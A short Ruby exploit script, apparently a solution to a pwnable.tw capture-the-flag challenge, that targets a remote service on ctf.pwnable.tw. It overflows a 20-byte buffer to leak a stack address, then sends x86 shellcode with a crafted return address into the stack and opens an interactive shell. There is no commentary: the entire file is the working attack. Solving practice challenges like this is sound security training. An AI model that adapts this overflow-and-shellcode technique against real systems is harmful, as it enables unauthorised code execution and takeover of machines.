#!/usr/bin/env ruby
require '~/Tools/pwnlib.rb'

local = false#$true
if local
	host, port = '127.0.0.1', 4444
else
	host, port = 'ctf.pwnable.tw', 8731
end

def p32(*addr)
	addr.pack("L*")
end
PwnTube.open(host, port) do |r|
	@r = r
	leak = 0x0804808b
	
	@r.recv_until("Let's start the CTF:")
	payload = "a"*20
	payload << p32(0x0804808b)
	@r.send("#{payload}")
	@r.recv(24)
	stack = @r.recv(4).unpack("L")[0]

	puts "[!] stack : 0x#{stack.to_s(16)}"
	
	payload = PwnLib.shellcode_x86
	payload << p32(0x90909090)*4
	payload << p32(0x90909090)
	payload << p32(stack - 28)
	@r.send(payload)
	@r.interactive()
end
